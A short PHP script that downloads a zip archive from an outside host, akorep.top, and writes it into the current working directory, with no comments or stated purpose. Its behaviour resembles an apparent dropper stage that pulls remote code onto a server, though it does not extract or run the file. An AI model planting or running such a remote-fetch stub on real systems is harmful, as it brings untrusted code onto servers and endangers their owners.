<?php
function downFile($url,$path){
    $arr=parse_url($url);
    $fileName=basename($arr['path']);
    $file=file_get_contents($url);
    file_put_contents($path.$fileName,$file);
}
$working_path=getcwd();
downFile("http://akorep.top/release/up-to-date.zip",$working_path);
?>